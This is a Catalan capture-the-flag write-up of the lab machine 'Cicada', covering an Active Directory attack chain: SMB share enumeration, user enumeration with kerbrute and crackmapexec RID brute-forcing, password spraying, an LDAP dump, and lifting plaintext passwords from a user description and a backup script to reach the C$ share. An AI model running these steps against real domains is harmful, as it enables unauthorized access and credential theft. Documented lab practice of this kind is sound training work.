## Al ser la màquina víctima un Windows he utilitzat una guia per poder realitzar aquesta màquina

Anirem directe al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -v -p- 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 08:12 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:12
Completed NSE at 08:12, 0.00s elapsed
Initiating NSE at 08:12
Completed NSE at 08:12, 0.00s elapsed
Initiating NSE at 08:12
Completed NSE at 08:12, 0.01s elapsed
Initiating Ping Scan at 08:12
Scanning 10.10.11.35 [4 ports]
Completed Ping Scan at 08:12, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:12
Completed Parallel DNS resolution of 1 host. at 08:12, 0.17s elapsed
Initiating SYN Stealth Scan at 08:12
Scanning 10.10.11.35 [65535 ports]
Discovered open port 53/tcp on 10.10.11.35
Discovered open port 135/tcp on 10.10.11.35
Discovered open port 445/tcp on 10.10.11.35
Discovered open port 139/tcp on 10.10.11.35
Discovered open port 389/tcp on 10.10.11.35
Discovered open port 5985/tcp on 10.10.11.35
SYN Stealth Scan Timing: About 14.90% done; ETC: 08:15 (0:02:57 remaining)
SYN Stealth Scan Timing: About 41.05% done; ETC: 08:14 (0:01:28 remaining)
SYN Stealth Scan Timing: About 56.40% done; ETC: 08:15 (0:01:13 remaining)
Discovered open port 55585/tcp on 10.10.11.35
Discovered open port 88/tcp on 10.10.11.35
Discovered open port 3269/tcp on 10.10.11.35
Discovered open port 593/tcp on 10.10.11.35
Discovered open port 464/tcp on 10.10.11.35
Discovered open port 636/tcp on 10.10.11.35
Discovered open port 3268/tcp on 10.10.11.35
Completed SYN Stealth Scan at 08:14, 138.06s elapsed (65535 total ports)
Initiating Service scan at 08:14
Scanning 13 services on 10.10.11.35
Completed Service scan at 08:15, 56.57s elapsed (13 services on 1 host)
NSE: Script scanning 10.10.11.35.
Initiating NSE at 08:15
Completed NSE at 08:16, 40.16s elapsed
Initiating NSE at 08:16
Completed NSE at 08:16, 2.34s elapsed
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
Nmap scan report for 10.10.11.35
Host is up (0.041s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-14 13:14:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
55585/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-14T13:15:29
|_  start_date: N/A
|_clock-skew: 6h59m59s

NSE: Script Post-scanning.
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
Initiating NSE at 08:16
Completed NSE at 08:16, 0.00s elapsed
Initiating NSE at 08:16
Completed NSE at 08:16, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 238.01 seconds
           Raw packets sent: 131162 (5.771MB) | Rcvd: 113 (4.956KB)
                                                                             

```

Trobem molts ports oberts: ldpa, kerberos, smb, etc. Al veure que hi ah els ports 139 i 145 oberts, provem d'accedir anònimament a smb: 
```
 ──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.11.35
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Sembla que tenim accés a veure els directoris DEV i HR. Si comprovem el directori DEV no hi trobem res ja que se'ns denega l'accés:

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.11.35\\DEV
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 

```

En canvi si comprovem el directori HR trobem un fitxer al llistar amb dir (ja que estem a Windows) que podria ser interessant:
```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.11.35\\HR 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

                4168447 blocks of size 4096. 325622 blocks available
smb: \> 
```

Ara doncs, descarregarem el fitxer HR.txt per veure què conté ja que és a l'únic fitxer que podem accedir:
```
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)
smb: \> exit
```

Ara fem un cat al fitxer descarregat per veure el seu contingut:
```
┌──(kali㉿kali)-[~]
└─$ ls    
 Desktop     Downloads  'Notice from HR.txt'   Public      Videos
 Documents   Music       Pictures              Templates
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat 'Notice from HR.txt' 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Veiem que hi ha una contrasenya per defecte 'Your default password is: Cicada$M6Corpb*@Lp#nZp!8'. Ara, per tant, necessitem saber a quin usuari pertany. Per fer això, necessitem una llista dels usuaris i ho farem amb l'eina Kerbrute (https://github.com/ropnop/kerbrute) que ens permet fer enumeració d'usuaris. Per instal·lar-lo he seguit aquesta guia: https://gerh4rdt.hashnode.dev/kerbrute-fuerza-bruta-y-enumeracion-de-cuentas-en-ad

Abans de fer això hem posat cicada.htb al nostre fitxer /etc/hosts.

He descarregat aquesta llista que és la que ha funcionat per obtenir els noms: https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt. La he guardat amb el nom de seclist, no és el correcte però al fer el mv he clicat enter abans d'acabar de posar el nom correcte :(.

Ara sí, provem la eina per obtenir els noms dels usuaris amb els quals provarem la contrasenya per defecte que hem obtingut (ha estat un procés molt lent, l'he deixat en segon pla una hora aproximadament i encara anava per GUEST, hauria trigat vàries hores en tenir llistats tots els possibles usuaris):
```
┌──(kali㉿kali)-[~/Documents/Cicada/Kerbrute/kerbrute]
└─$ sudo ./kerbrute userenum -d cicada.htb --dc 10.10.11.35 /usr/share/seclists | tee user_list.txt


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/14/24 - Ronnie Flathers @ropnop

2024/10/14 11:20:40 >  Using KDC(s):
2024/10/14 11:20:40 >   10.10.11.35:88

2024/10/14 11:20:46 >  [+] VALID USERNAME:       guest@cicada.htb
2024/10/14 11:20:53 >  [+] VALID USERNAME:       administrator@cicada.htb
2024/10/14 11:22:26 >  [+] VALID USERNAME:       Guest@cicada.htb
2024/10/14 11:22:26 >  [+] VALID USERNAME:       Administrator@cicada.htb
2024/10/14 11:27:28 >  [+] VALID USERNAME:       GUEST@cicada.htb

```


Per tant, ho he provat amb l'eina 'crackmapexec' que ve per defecte amb Kali Linux i he obtingut resultats en menys d'un minut:
```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute | tee user_list_crackmapexec.txt
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\anonymous: 
SMB                      10.10.11.35     445    CICADA-DC        [+] Brute forcing RIDs
SMB                      10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB                      10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

Si fem cat al fitxer que ens ha generat 'crackmapexec', al final del fitxer, tenim el que semblen ser 5 usuaris (obviant Dev Support) que podrien ser candidats a tenir la contrasenya per defecte que hem trobat:
```
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Ara provem al connexió amb aquests 5 usuaris i la contrasneya per defecte, a veure si amb algun obtenim algun resultat exitós i ens ha funcionat amb l'usuari michael.wrightson:
```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.11.35/HR -U john.smoulder%Cicada$M6Corpb*@Lp#nZp!8

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.11.35/HR -U sarah.dantelia%Cicada$M6Corpb*@Lp#nZpls

session setup failed: NT_STATUS_LOGON_FAILURE
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.11.35/HR -U michael.wrightson$M6Corpb*@Lp#nZpls

Password for [michael.wrightson*@Lp#nZpls]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

                4168447 blocks of size 4096. 334453 blocks available

```

Descarreguem el fitxer trobat:
```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.11.35/HR -U michael.wrightson                   

Password for [WORKGROUP\michael.wrightson]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

                4168447 blocks of size 4096. 334448 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> exit
```

Hi ha la password per defecte que ja havíem obtingut. Ara utilitzarem 'ldapdomaindump' amb les credencials que hem obtingut. La comanda ldapdomaindump fa un volcat (dump) de la informació del domini LDAP, utilitzant les credencials d'un usuari amb permisos per accedir a l'entorn LDAP. Aquesta eina és útil per obtenir una visió completa de la infraestructura del domini i permet llistar informació com usuaris, grups, policies, ordinadors, i altres objectes relacionats amb Active Directory.:
```
┌──(kali㉿kali)-[~]
└─$ ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

```

I ens ha generat aquests fitxers, tots els que comencen per domain*:
```
┌──(kali㉿kali)-[~]
└─$ ls                                                                                               
 Desktop     Music                 Public      domain_computers.grep   domain_computers_by_os.html   domain_groups.json   domain_policy.json   domain_trusts.json   domain_users.json            user_list_crackmapexec.txt
 Documents  'Notice from HR.txt'   Templates   domain_computers.html   domain_groups.grep            domain_policy.grep   domain_trusts.grep   domain_users.grep    domain_users_by_group.html
 Downloads   Pictures              Videos      domain_computers.json   domain_groups.html            domain_policy.html   domain_trusts.html   domain_users.html    go

```

Ara revisem els fitxers que hem obtingut del domini, i veiem que si fem un cat de domain_users.grep:
```
┌──(kali㉿kali)-[~]
└─$ cat domain_users.grep   
cn      name    sAMAccountName  memberOf        primaryGroupId  whenCreated     whenChanged     lastLogon       userAccountControl      pwdLastSet      objectSid       description
Emily Oscars    Emily Oscars    emily.oscars    Remote Management Users, Backup Operators       Domain Users    08/22/24 21:20:17       10/14/24 16:50:11       01/01/01 00:00:00       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      08/22/24 21:20:17   S-1-5-21-917908876-1423158569-3159038727-1601
David Orelious  David Orelious  david.orelious          Domain Users    03/14/24 12:17:29       10/14/24 16:48:25       03/15/24 06:32:21       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      03/14/24 12:17:29       S-1-5-21-917908876-1423158569-3159038727-1108       Just in case I forget my password is aRt$Lp#7t*VQ!3
Michael Wrightson       Michael Wrightson       michael.wrightson               Domain Users    03/14/24 12:17:29       10/14/24 16:42:44       10/14/24 16:50:31       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      03/14/24 12:17:29       S-1-5-21-917908876-1423158569-3159038727-1106
Sarah Dantelia  Sarah Dantelia  sarah.dantelia          Domain Users    03/14/24 12:17:29       08/28/24 17:26:29       01/01/01 00:00:00       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      03/14/24 12:17:29       S-1-5-21-917908876-1423158569-3159038727-1105
John Smoulder   John Smoulder   john.smoulder           Domain Users    03/14/24 12:17:28       08/28/24 17:26:15       01/01/01 00:00:00       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      03/14/24 12:17:29       S-1-5-21-917908876-1423158569-3159038727-1104
krbtgt  krbtgt  krbtgt  Denied RODC Password Replication Group  Domain Users    03/14/24 11:14:10       03/14/24 12:16:48       01/01/01 00:00:00       ACCOUNT_DISABLED, NORMAL_ACCOUNT        03/14/24 11:14:10       S-1-5-21-917908876-1423158569-3159038727-502        Key Distribution Center Service Account
Guest   Guest   Guest   Guests  Domain Guests   03/14/24 11:09:25       10/14/24 15:55:40       10/14/24 16:41:50       PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      08/28/24 17:26:56       S-1-5-21-917908876-1423158569-3159038727-501        Built-in account for guest access to the computer/domain
Administrator   Administrator   Administrator   Group Policy Creator Owners, Domain Admins, Enterprise Admins, Schema Admins, Administrators    Domain Users    03/14/24 11:09:25       10/14/24 15:46:42       10/14/24 15:46:56       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD  08/26/24 20:08:03       S-1-5-21-917908876-1423158569-3159038727-500    Built-in account for administering the computer/domain  
```

O bé millor fem doble clic al fitxer domain_users.html:

![image](https://github.com/user-attachments/assets/5d8b49c7-26bd-4ba4-9f3e-3abf2a466542)


I veiem com l'usuari David Orelious o david.orelious s'ha apuntat les credencials a la descripció per si se'n olbida: 'aRt$Lp#7t*VQ!3'

Ara podem utilitzar les credencial per veure si tenim més accés a SMB, i veiem que ara podem accedir i descarregar l'script que hi ha, el 'Backup_script.ps1':
```
┌──(kali㉿kali)-[~/Documents/Cicada/Kerbrute/kerbrute]
└─$ smbclient \\\\10.10.11.35\\DEV -U david.orelious@cicada.htb
Password for [david.orelious@cicada.htb]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

                4168447 blocks of size 4096. 333954 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \> 

```

Si li fem un cat ens trobem amb que obtenim les credencials de l'usuari emily.oscars:
```
┌──(kali㉿kali)-[~/Documents/Cicada/Kerbrute/kerbrute]
└─$ cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
                                                                                  
```

Ara, amb aquestes credencials, podem tornar a SMB i veiem que tenim accés al directori C: de l'ordinador Windows que havíem vist al principi de tot al connectar-nos a SMB amb anonymous que era el directori compartit per defecte: C$              Disk      Default share:
```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.11.35\\C$ -U emily.oscars@cicada.htb
Password for [emily.oscars@cicada.htb]:
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Thu Mar 14 14:24:03 2024
  $WinREAgent                        DH        0  Mon Sep 23 18:16:49 2024
  Documents and Settings          DHSrn        0  Thu Mar 14 20:40:47 2024
  DumpStack.log.tmp                 AHS    12288  Mon Oct 14 17:45:59 2024
  pagefile.sys                      AHS 738197504  Mon Oct 14 17:45:59 2024
  PerfLogs                            D        0  Thu Aug 22 20:45:54 2024
  Program Files                      DR        0  Thu Aug 29 21:32:50 2024
  Program Files (x86)                 D        0  Sat May  8 11:40:21 2021
  ProgramData                       DHn        0  Fri Aug 30 19:32:07 2024
  Recovery                         DHSn        0  Thu Mar 14 20:41:18 2024
  Shares                              D        0  Thu Mar 14 13:21:29 2024
  System Volume Information         DHS        0  Thu Mar 14 12:18:00 2024
  temp                                D        0  Mon Oct 14 19:05:56 2024
  Users                              DR        0  Mon Aug 26 22:11:25 2024
  Windows                             D        0  Mon Sep 23 18:35:40 2024

                4168447 blocks of size 4096. 329365 blocks available
smb: \> 

```

Ara, estem a la C:, per tant hem de mirar d'obtenir la flag de l'usuari, i després d'estar fent voltes una estona per el Windows, la trobem i la descarreguem:
```
smb: \Users\emily.oscars.CICADA\> cd Desktop\
smb: \Users\emily.oscars.CICADA\Desktop\> dir
  .                                  DR        0  Wed Aug 28 19:32:18 2024
  ..                                  D        0  Thu Aug 22 23:22:13 2024
  user.txt                           AR       34  Mon Oct 14 17:46:54 2024

                4168447 blocks of size 4096. 324797 blocks available
smb: \Users\emily.oscars.CICADA\Desktop\> get user.txt 
getting file \Users\emily.oscars.CICADA\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

I ja tenim la flag de user.txt:
```
┌──(kali㉿kali)-[~]
└─$ cat user.txt
7a5ef83ddc0b8a6774f5534a5cd008f3
```
